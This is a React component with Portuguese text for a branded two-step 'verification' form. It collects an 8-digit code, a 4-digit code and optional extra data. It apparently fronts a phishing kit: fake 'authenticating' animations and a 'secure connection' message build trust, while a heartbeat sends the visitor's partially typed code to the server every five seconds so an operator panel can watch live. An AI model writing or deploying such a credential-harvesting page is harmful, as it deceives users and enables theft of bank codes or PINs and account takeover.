import React, { useEffect, useRef, useState } from 'react';
import {
  AlertCircle,
  ArrowRight,
  Check,
  CheckCircle2,
  Copy,
  Loader2,
  RotateCcw,
  ShieldCheck,
} from 'lucide-react';
import { FormConfig, SubmissionRecord } from '../types';
import { BrandLogo } from './BrandLogo';
import { OtpDigitInput } from './OtpDigitInput';

type FlowStep =
  | 'entering'
  | 'code8'
  | 'authenticating8'
  | 'verified8'
  | 'code4'
  | 'authenticating4'
  | 'completed';

interface LiveVerificationFormProps {
  config: FormConfig;
}

function formatCode8(code: string): string {
  if (code.length !== 8) return code;
  return `${code.slice(0, 4)}-${code.slice(4)}`;
}

function makeSessionId(): string {
  return `vis-${Math.random().toString(36).slice(2, 10)}-${Date.now().toString(36)}`;
}

export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
  config,
}) => {
  const [step, setStep] = useState<FlowStep>('entering');
  const [code8, setCode8] = useState('');
  const [code4, setCode4] = useState('');
  const [extraData, setExtraData] = useState<Record<string, string>>({});
  const [submissionId, setSubmissionId] = useState<string>('');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [completedRecord, setCompletedRecord] = useState<SubmissionRecord | null>(null);
  const [copiedReceipt, setCopiedReceipt] = useState(false);

  const sessionIdRef = useRef<string>(makeSessionId());
  const startTimeRef = useRef<number>(Date.now());
  const autoAdvanceTimerRef = useRef<number | null>(null);

  const enabledExtras = config.extraFields.filter((f) => f.enabled);

  // Entry authentication animation (~1.4s) when visitor enters the site
  useEffect(() => {
    const timer = window.setTimeout(() => {
      setStep((curr) => (curr === 'entering' ? 'code8' : curr));
    }, 1400);
    return () => window.clearTimeout(timer);
  }, []);

  // Presence heartbeat so admin sees live online visitors in /painel
  useEffect(() => {
    const stepLabelMap: Record<FlowStep, string> = {
      entering: 'Conectando...',
      code8: 'Preenchendo 8 dígitos',
      authenticating8: 'Autenticando 8 dígitos',
      verified8: '8 dígitos verificados',
      code4: 'Preenchendo 4 dígitos',
      authenticating4: 'Autenticando 4 dígitos',
      completed: 'Formulário concluído',
    };

    const sendHeartbeat = () => {
      fetch('/api/presence', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: sessionIdRef.current,
          step: stepLabelMap[step],
          code8: code8.replace(/\D/g, ''),
        }),
      }).catch(() => {});
    };

    sendHeartbeat();
    const interval = window.setInterval(sendHeartbeat, 5000);
    return () => window.clearInterval(interval);
  }, [step, code8]);

  useEffect(() => {
    return () => {
      if (autoAdvanceTimerRef.current) {
        window.clearTimeout(autoAdvanceTimerRef.current);
      }
    };
  }, []);

  const resetForm = () => {
    if (autoAdvanceTimerRef.current) {
      window.clearTimeout(autoAdvanceTimerRef.current);
    }
    setStep('code8');
    setCode8('');
    setCode4('');
    setExtraData({});
    setSubmissionId('');
    setErrorMsg(null);
    setCompletedRecord(null);
    setCopiedReceipt(false);
    startTimeRef.current = Date.now();
  };

  const handleVerifyCode8 = async () => {
    const candidate = code8.replace(/\D/g, '');
    if (candidate.length !== 8) {
      setErrorMsg('Informe todos os 8 dígitos numéricos para continuar.');
      return;
    }

    setErrorMsg(null);
    setStep('authenticating8');

    try {
      const [res] = await Promise.all([
        fetch('/api/verify-step1', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code8: candidate }),
        }),
        new Promise((resolve) => window.setTimeout(resolve, 1000)),
      ]);

      const data = (await res.json()) as {
        ok?: boolean;
        submissionId?: string;
        error?: string;
      };

      if (!res.ok || !data.ok) {
        setStep('code8');
        setErrorMsg(
          data.error ?? 'Não foi possível validar o código de 8 dígitos.'
        );
        return;
      }

      setSubmissionId(data.submissionId ?? '');
      setStep('verified8');

      if (config.autoAdvance) {
        autoAdvanceTimerRef.current = window.setTimeout(() => {
          setStep('code4');
        }, 1500);
      }
    } catch {
      setStep('code8');
      setErrorMsg('Falha de conexão ao verificar o código. Tente novamente.');
    }
  };

  const handleGoToStep2 = () => {
    if (autoAdvanceTimerRef.current) {
      window.clearTimeout(autoAdvanceTimerRef.current);
    }
    setErrorMsg(null);
    setStep('code4');
  };

  const handleVerifyCode4 = async () => {
    const candidate4 = code4.replace(/\D/g, '');
    if (candidate4.length !== 4) {
      setErrorMsg('Informe todos os 4 dígitos para concluir a verificação.');
      return;
    }

    for (const field of enabledExtras) {
      if (field.required && !(extraData[field.id] ?? '').trim()) {
        setErrorMsg(`Preencha o campo obrigatório "${field.label}".`);
        return;
      }
    }

    setErrorMsg(null);
    setStep('authenticating4');

    try {
      const [res] = await Promise.all([
        fetch('/api/verify-step2', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            submissionId,
            code8: code8.replace(/\D/g, ''),
            code4: candidate4,
            extraData,
            durationMs: Date.now() - startTimeRef.current,
          }),
        }),
        new Promise((resolve) => window.setTimeout(resolve, 1000)),
      ]);

      const data = (await res.json()) as {
        ok?: boolean;
        record?: SubmissionRecord;
        error?: string;
      };

      if (!res.ok || !data.ok || !data.record) {
        setStep('code4');
        setErrorMsg(data.error ?? 'Não foi possível confirmar o código de 4 dígitos.');
        return;
      }

      setCompletedRecord(data.record);
      setStep('completed');
    } catch {
      setStep('code4');
      setErrorMsg('Falha de conexão ao enviar o formulário. Tente novamente.');
    }
  };

  const handleCopyReceipt = () => {
    if (!completedRecord) return;
    const summary = [
      `Protocolo: ${completedRecord.protocol}`,
      `Status: ${completedRecord.status}`,
      `Código de 8 dígitos: ${formatCode8(completedRecord.code8)}`,
      `Código de 4 dígitos: ${completedRecord.code4}`,
      `Data: ${new Date(completedRecord.createdAt).toLocaleString('pt-BR')}`,
    ].join('\n');
    navigator.clipboard?.writeText(summary);
    setCopiedReceipt(true);
    window.setTimeout(() => setCopiedReceipt(false), 2000);
  };

  const isAuthenticating =
    step === 'entering' || step === 'authenticating8' || step === 'authenticating4';

  const stepIndex =
    step === 'entering' || step === 'code8' || step === 'authenticating8'
      ? 1
      : step === 'verified8' || step === 'code4' || step === 'authenticating4'
      ? 2
      : 3;

  return (
    <div className="w-full max-w-2xl mx-auto">
      <div className="bg-white border border-neutral-200 rounded-xl overflow-hidden shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
        {/* Brand Yellow #FCFC30 Top Strip */}
        <div className="h-2 w-full bg-[#FCFC30]" aria-hidden="true" />

        {/* Form Header */}
        <div className="px-6 sm:px-8 pt-7 pb-6 border-b border-neutral-200">
          <div className="flex items-center justify-between gap-4 text-xs mb-4">
            <div className="flex items-center gap-2.5 min-w-0">
              <BrandLogo
                brandName={config.brandName}
                logoUrl={config.logoUrl}
                size="sm"
              />
              <span className="font-semibold text-black truncate">
                {config.brandName}
              </span>
            </div>
            <span className="font-mono tabular-nums font-medium text-[#3D5AFF] shrink-0">
              {step === 'entering'
                ? 'Conectando'
                : step === 'completed'
                ? 'Concluído'
                : `Etapa ${stepIndex} de 2`}
            </span>
          </div>

          <h1 className="text-2xl sm:text-[26px] font-bold tracking-tight text-black leading-snug text-balance">
            {config.title}
          </h1>
          <p className="mt-2 text-sm sm:text-[15px] text-neutral-700 leading-relaxed">
            {config.description}
          </p>

          {/* Step Progress Strip */}
          <div className="mt-6 grid grid-cols-3 gap-3 text-xs">
            <div className="space-y-1.5">
              <div
                className={`h-1.5 rounded-full transition-colors duration-200 ${
                  step === 'entering' || step === 'code8' || step === 'authenticating8'
                    ? 'bg-[#FCFC30]'
                    : 'bg-emerald-600'
                }`}
              />
              <span
                className={`block font-medium ${
                  step === 'entering' || step === 'code8' || step === 'authenticating8'
                    ? 'text-black'
                    : 'text-emerald-700'
                }`}
              >
                01. Código de 8 dígitos
              </span>
            </div>

            <div className="space-y-1.5">
              <div
                className={`h-1.5 rounded-full transition-colors duration-200 ${
                  step === 'entering' || step === 'code8' || step === 'authenticating8'
                    ? 'bg-neutral-200'
                    : step === 'completed'
                    ? 'bg-emerald-600'
                    : 'bg-[#FCFC30]'
                }`}
              />
              <span
                className={`block font-medium ${
                  step === 'entering' || step === 'code8' || step === 'authenticating8'
                    ? 'text-neutral-400'
                    : step === 'completed'
                    ? 'text-emerald-700'
                    : 'text-black'
                }`}
              >
                02. Código de 4 dígitos
              </span>
            </div>

            <div className="space-y-1.5">
              <div
                className={`h-1.5 rounded-full transition-colors duration-200 ${
                  step === 'completed' ? 'bg-emerald-600' : 'bg-neutral-200'
                }`}
              />
              <span
                className={`block font-medium ${
                  step === 'completed' ? 'text-emerald-700' : 'text-neutral-400'
                }`}
              >
                03. Concluído
              </span>
            </div>
          </div>
        </div>

        {/* Form Interactive Body */}
        <div className="px-6 sm:px-8 py-7">
          {isAuthenticating && (
            <div className="py-10 flex flex-col items-center text-center space-y-5">
              <div className="w-14 h-14 rounded-2xl bg-[#FCFC30] flex items-center justify-center shadow-sm">
                <Loader2
                  className="w-7 h-7 text-[#3D5AFF] animate-spin"
                  aria-hidden="true"
                />
              </div>

              <div className="space-y-1.5 max-w-sm">
                <h2 className="text-lg font-semibold text-black">
                  {config.authLoadingText || 'Fazendo autenticação, aguarde...'}
                </h2>
                <p className="text-sm text-neutral-600">
                  {step === 'entering'
                    ? 'Estabelecendo conexão segura com o formulário.'
                    : step === 'authenticating8'
                    ? 'Validando os 8 dígitos informados.'
                    : 'Confirmando os 4 dígitos finais.'}
                </p>
              </div>

              <div className="w-60 h-1.5 bg-neutral-100 rounded-full overflow-hidden">
                <div className="w-24 h-full bg-[#3D5AFF] rounded-full animate-auth-bar" />
              </div>
            </div>
          )}

          {step === 'code8' && (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleVerifyCode8();
              }}
              className="space-y-6"
            >
              <div>
                <label className="block text-lg font-semibold text-black">
                  {config.step1Title}
                </label>
                <p className="mt-1 text-sm text-neutral-600">{config.step1Helper}</p>
              </div>

              <OtpDigitInput
                length={8}
                groupAfter={4}
                value={code8}
                onChange={(val) => {
                  setCode8(val);
                  if (errorMsg) setErrorMsg(null);
                }}
                hasError={Boolean(errorMsg)}
                ariaLabelPrefix="Dígito do código de 8 dígitos"
              />

              {errorMsg && (
                <div
                  role="alert"
                  className="flex items-start gap-2.5 p-3.5 rounded-lg border border-red-200 bg-red-50 text-sm text-red-800"
                >
                  <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" aria-hidden="true" />
                  <span>{errorMsg}</span>
                </div>
              )}

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={code8.replace(/\D/g, '').length < 8}
                  className="inline-flex items-center justify-center gap-2 px-5 py-2.5 rounded-lg bg-[#3D5AFF] text-white text-sm font-semibold hover:bg-[#2F48E8] disabled:bg-neutral-200 disabled:text-neutral-400 disabled:cursor-not-allowed transition-colors whitespace-nowrap shrink-0 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#3D5AFF] focus-visible:ring-offset-2"
                >
                  <span>Verificar código de 8 dígitos</span>
                  <ArrowRight className="w-4 h-4" aria-hidden="true" />
                </button>
              </div>
            </form>
          )}

          {step === 'verified8' && (
            <div className="py-3 space-y-6">
              <div className="p-5 rounded-xl border border-emerald-200 bg-emerald-50/70 space-y-3">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg bg-emerald-600 text-white flex items-center justify-center shrink-0">
                    <CheckCircle2 className="w-5 h-5" aria-hidden="true" />
                  </div>
                  <div>
                    <h2 className="text-lg font-semibold text-emerald-950">
                      {config.step1SuccessTitle}
                    </h2>
                    <p className="text-xs text-emerald-800 font-mono tabular-nums mt-0.5">
                      Código validado: {formatCode8(code8)}
                    </p>
                  </div>
                </div>

                <p className="text-sm text-emerald-900 leading-relaxed">
                  {config.step1SuccessMessage}
                </p>
              </div>

              <div className="flex flex-wrap items-center justify-between gap-3">
                <button
                  type="button"
                  onClick={handleGoToStep2}
                  className="inline-flex items-center gap-2 px-5 py-2.5 rounded-lg bg-[#3D5AFF] text-white text-sm font-semibold hover:bg-[#2F48E8] transition-colors whitespace-nowrap shrink-0 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#3D5AFF] focus-visible:ring-offset-2"
                >
                  <span>Informar código de 4 dígitos</span>
                  <ArrowRight className="w-4 h-4" aria-hidden="true" />
                </button>

                {config.autoAdvance && (
                  <span className="text-xs text-neutral-600">
                    Avançando automaticamente para os 4 dígitos...
                  </span>
                )}
              </div>
            </div>
          )}

          {step === 'code4' && (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleVerifyCode4();
              }}
              className="space-y-6"
            >
              <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-3 rounded-lg border border-emerald-200 bg-emerald-50/60">
                <div className="flex items-center gap-2.5 text-sm text-emerald-900">
                  <CheckCircle2 className="w-4 h-4 text-emerald-700 shrink-0" aria-hidden="true" />
                  <span className="font-medium">{config.step1SuccessTitle}</span>
                  <span aria-hidden="true" className="text-emerald-400">·</span>
                  <span className="font-mono tabular-nums text-xs text-emerald-800">
                    {formatCode8(code8)}
                  </span>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    setStep('code8');
                    setCode4('');
                    setErrorMsg(null);
                  }}
                  className="text-xs font-medium text-[#3D5AFF] hover:opacity-80 underline underline-offset-4 whitespace-nowrap shrink-0"
                >
                  Alterar código
                </button>
              </div>

              <div>
                <label className="block text-lg font-semibold text-black">
                  {config.step2Title}
                </label>
                <p className="mt-1 text-sm text-neutral-600">{config.step2Helper}</p>
              </div>

              <OtpDigitInput
                length={4}
                value={code4}
                onChange={(val) => {
                  setCode4(val);
                  if (errorMsg) setErrorMsg(null);
                }}
                masked={config.maskCode4}
                allowMaskToggle={true}
                hasError={Boolean(errorMsg)}
                ariaLabelPrefix="Dígito do código de 4 dígitos"
              />

              {enabledExtras.length > 0 && (
                <div className="pt-4 border-t border-neutral-200 space-y-4">
                  <p className="text-xs font-medium text-neutral-600">
                    Dados complementares
                  </p>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {enabledExtras.map((field) => (
                      <div key={field.id} className="space-y-1.5">
                        <label
                          htmlFor={`extra-${field.id}`}
                          className="block text-sm font-medium text-black"
                        >
                          {field.label}
                          {field.required && <span className="text-red-600 ml-1">*</span>}
                        </label>
                        <input
                          id={`extra-${field.id}`}
                          type={field.type}
                          placeholder={field.placeholder}
                          value={extraData[field.id] ?? ''}
                          onChange={(e) =>
                            setExtraData((prev) => ({
                              ...prev,
                              [field.id]: e.target.value,
                            }))
                          }
                          className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-neutral-300 bg-white text-black placeholder:text-neutral-400 focus:outline-none focus:border-[#3D5AFF] focus:ring-4 focus:ring-[#3D5AFF]/20 transition-colors"
                        />
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {errorMsg && (
                <div
                  role="alert"
                  className="flex items-start gap-2.5 p-3.5 rounded-lg border border-red-200 bg-red-50 text-sm text-red-800"
                >
                  <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" aria-hidden="true" />
                  <span>{errorMsg}</span>
                </div>
              )}

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={code4.replace(/\D/g, '').length < 4}
                  className="inline-flex items-center justify-center gap-2 px-5 py-2.5 rounded-lg bg-[#3D5AFF] text-white text-sm font-semibold hover:bg-[#2F48E8] disabled:bg-neutral-200 disabled:text-neutral-400 disabled:cursor-not-allowed transition-colors whitespace-nowrap shrink-0 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#3D5AFF] focus-visible:ring-offset-2"
                >
                  <ShieldCheck className="w-4 h-4" aria-hidden="true" />
                  <span>Confirmar código de 4 dígitos</span>
                </button>
              </div>
            </form>
          )}

          {step === 'completed' && completedRecord && (
            <div className="space-y-6">
              <div className="p-5 rounded-xl border border-emerald-200 bg-emerald-50/70">
                <div className="flex items-start gap-3.5">
                  <div className="w-10 h-10 rounded-lg bg-emerald-600 text-white flex items-center justify-center shrink-0">
                    <CheckCircle2 className="w-5 h-5" aria-hidden="true" />
                  </div>
                  <div>
                    <h2 className="text-lg font-semibold text-emerald-950">
                      {config.finalSuccessTitle}
                    </h2>
                    <p className="mt-1 text-sm text-emerald-900 leading-relaxed">
                      {config.finalSuccessMessage}
                    </p>
                  </div>
                </div>
              </div>

              <div className="border-t border-b border-neutral-200 divide-y divide-neutral-200 text-sm">
                <div className="py-3 flex items-center justify-between gap-4">
                  <span className="text-neutral-600">Protocolo</span>
                  <span className="font-mono font-semibold tabular-nums text-black">
                    {completedRecord.protocol}
                  </span>
                </div>
                <div className="py-3 flex items-center justify-between gap-4">
                  <span className="text-neutral-600">Código principal (8 dígitos)</span>
                  <span className="inline-flex items-center gap-2 font-mono tabular-nums text-black">
                    <Check className="w-3.5 h-3.5 text-emerald-600" aria-hidden="true" />
                    {formatCode8(completedRecord.code8)}
                  </span>
                </div>
                <div className="py-3 flex items-center justify-between gap-4">
                  <span className="text-neutral-600">Confirmação (4 dígitos)</span>
                  <span className="inline-flex items-center gap-2 font-mono tabular-nums text-black">
                    <Check className="w-3.5 h-3.5 text-emerald-600" aria-hidden="true" />
                    {config.maskCode4 ? '••••' : completedRecord.code4}
                  </span>
                </div>
                {Object.entries(completedRecord.extraData).map(([key, val]) => {
                  if (!val) return null;
                  const meta = config.extraFields.find((f) => f.id === key);
                  return (
                    <div key={key} className="py-3 flex items-center justify-between gap-4">
                      <span className="text-neutral-600">{meta?.label ?? key}</span>
                      <span className="text-black font-medium">{val}</span>
                    </div>
                  );
                })}
                <div className="py-3 flex items-center justify-between gap-4">
                  <span className="text-neutral-600">Registrado em</span>
                  <span className="font-mono tabular-nums text-neutral-700 text-xs">
                    {new Date(completedRecord.createdAt).toLocaleString('pt-BR')}
                  </span>
                </div>
              </div>

              <div className="flex flex-wrap items-center gap-3">
                <button
                  type="button"
                  onClick={resetForm}
                  className="inline-flex items-center gap-2 px-4 py-2.5 rounded-lg bg-[#3D5AFF] text-white text-sm font-semibold hover:bg-[#2F48E8] transition-colors whitespace-nowrap shrink-0 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#3D5AFF] focus-visible:ring-offset-2"
                >
                  <RotateCcw className="w-4 h-4" aria-hidden="true" />
                  <span>Nova verificação</span>
                </button>

                <button
                  type="button"
                  onClick={handleCopyReceipt}
                  className="inline-flex items-center gap-2 px-4 py-2.5 rounded-lg border border-neutral-300 bg-white text-[#3D5AFF] text-sm font-medium hover:bg-neutral-50 transition-colors whitespace-nowrap shrink-0 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#3D5AFF]"
                >
                  {copiedReceipt ? (
                    <>
                      <Check className="w-4 h-4 text-emerald-600" aria-hidden="true" />
                      <span>Comprovante copiado</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-4 h-4" aria-hidden="true" />
                      <span>Copiar comprovante</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
